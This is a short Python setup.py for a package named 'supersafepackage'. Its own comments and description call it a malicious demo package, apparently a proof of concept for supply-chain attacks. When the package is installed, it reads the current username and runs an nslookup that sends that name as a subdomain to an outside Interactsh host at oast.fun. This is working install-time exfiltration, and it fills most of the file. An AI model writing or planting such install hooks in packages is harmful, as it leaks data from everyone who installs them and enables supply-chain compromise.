import os
import getpass
from setuptools import setup, find_packages

#Malicious payload: triggers DNS request to Interactsh
user = getpass.getuser()
os.system(f"nslookup {user}.dbwgovzrtoclyqrugbqep4d7rn1lljtoe.oast.fun")
# Package setup
setup(
    name='supersafepackage',          
    version='3.0.1',
    description='Malicious package for demo',
    packages=find_packages(),
)
